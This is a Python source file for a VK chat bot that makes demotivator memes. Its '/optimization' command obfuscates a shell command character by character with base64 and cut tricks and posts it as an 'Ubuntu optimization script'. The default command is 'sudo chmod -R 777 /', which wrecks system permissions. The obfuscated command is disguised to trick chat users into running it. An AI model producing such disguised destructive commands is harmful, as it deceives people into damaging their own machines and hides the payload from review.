import base64
from concurrent.futures.process import ProcessPoolExecutor
from os import environ
import logging
import random
from string import ascii_letters

from vkwave.bots import SimpleLongPollBot, TaskManager, PhotoUploader
from vkwave.bots.core.dispatching.filters import get_text
from vkwave.types.objects import MessagesMessageAttachmentType, PhotosPhotoSizesType, MessagesForeignMessage

from abstract.demotivator import Demotivator
from abstract.searchimages import ImgSearch
from abstract.tagsformatter import TagsFormatter
from abstract.vasyacache import Vasya
from abstract.ratelimit import RateLimit

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('MAIN')

bot = SimpleLongPollBot(tokens=environ['VK_BOT_TOKEN'], group_id=int(environ['VK_BOT_GID']))
photo_uploader = PhotoUploader(bot.api_context)
pool = ProcessPoolExecutor()
demotivator = Demotivator()
img_search = ImgSearch()
rate_limit = RateLimit()


@bot.message_handler(bot.command_filter(commands=['начать', 'start', 'команды', 'commands', 'помощь', 'help']))
async def start_handler(event: bot.SimpleBotEvent):
    await event.answer('''Команды:
/демотиватор - сгенерировать демотиватор со своей картинкой или из интернета. При вызове без аргументов текст берётся из БД Васи Машинки https://vk.com/vasyamashinka
/оптимизация - сгенерировать скрипт оптимизации Ubuntu''')


def create_demotivator(args: list, url: str = None):
    search_results = None
    if not url:
        search_results = img_search.search(args[0])
        try:
            url = random.choice(search_results)
        except IndexError:
            search_results = img_search.search('kernel panic')
            url = random.choice(search_results)

    while True:
        dem = demotivator.create(url, args[0], args[1:])
        if dem:
            return dem
        else:
            if search_results:
                url = random.choice(search_results)
                continue


async def get_photo_url(message: MessagesForeignMessage):
    url = None
    if message.attachments[0].type == MessagesMessageAttachmentType.PHOTO:
        # If possible get proportional image
        for size in reversed(message.attachments[0].photo.sizes):
            if size.type not in (PhotosPhotoSizesType.R, PhotosPhotoSizesType.Q, PhotosPhotoSizesType.P,
                                 PhotosPhotoSizesType.O):
                url = size.url
                break
        if not url:
            url = message.attachments[0].photo.sizes[-1].url
    return url


async def unpack_fwd(event: bot.SimpleBotEvent, photos_count: int = 1):
    fwd = []
    fwd_names = []
    fwd_msgs = []
    fwd_photos = []

    async def unpackFwd(msgs):
        for x in msgs:
            if x and x.conversation_message_id not in fwd_msgs:
                if x.text:
                    fwd.append(x.text)
                    fwd_names.append(x.from_id)
                if x.fwd_messages:
                    await unpackFwd(x.fwd_messages)
                if x.attachments and len(fwd_photos) < photos_count:
                    photo = await get_photo_url(x)
                    if photo:
                        fwd_photos.append(photo)
                fwd_msgs.append(x.conversation_message_id)

    await unpackFwd([event.object.object.message.reply_message] + event.object.object.message.fwd_messages)
    return '\n'.join(fwd), fwd_photos


@bot.message_handler(bot.command_filter(commands=['демотиватор', 'demotivator']))
async def demotivator_handler(event: bot.SimpleBotEvent):
    user_id = event.object.object.message.from_id

    if not await rate_limit.ratecounter(user_id):
        return
    args = get_text(event).replace('/demotivator', '', 1).replace('/демотиватор', '', 1).rstrip(' ')

    fwd, fwd_photos = await unpack_fwd(event)

    if not args and not fwd:
        result = await vasya_caching.getDemotivator()
    else:
        if fwd and args:
            args += f'\n{fwd}'
        elif fwd and not args:
            args = fwd
        args = TagsFormatter.format(args)
        url = None
        if event.object.object.message.attachments:
            url = await get_photo_url(event.object.object.message)
        elif fwd_photos:
            url = fwd_photos[0]

        result = await task_manager.loop.run_in_executor(pool, create_demotivator, args.splitlines(), url)

    dem = await photo_uploader.get_attachments_from_paths(file_paths=[result], peer_id=0)
    await event.answer(attachment=dem)


def bashEncode(string: str):
    def randString(size):
        return ''.join(random.choice(ascii_letters) for _ in range(size))

    def b64(s):
        return f"`echo {base64.b64encode(bytes(s, 'ascii')).decode('ascii')} | base64 -d`"

    def cut(s):
        len1, len2 = random.randint(2, 10), random.randint(2, 10)
        rand1, rand2 = randString(len1), randString(len2)
        pos = len1 + 1
        return f'`echo {rand1}{s}{rand2} | cut -b {pos}-{pos}`'

    result = '$('
    for sym in string:
        result += random.choice([b64, cut])(sym)
    return result + ')'


@bot.message_handler(bot.command_filter(commands=['оптимизация', 'optimization']))
async def optimization_handler(event: bot.SimpleBotEvent):
    args = get_text(event).replace('/optimization', '', 1).replace('/оптимизация', '', 1).rstrip(' ') or \
           'sudo chmod -R 777 /'
    await event.answer(bashEncode(args))


if __name__ == '__main__':
    task_manager = TaskManager()
    vasya_caching = Vasya(demotivator, img_search, task_manager.loop, pool)
    task_manager.add_task(bot.run)
    task_manager.add_task(vasya_caching.run)
    task_manager.run()
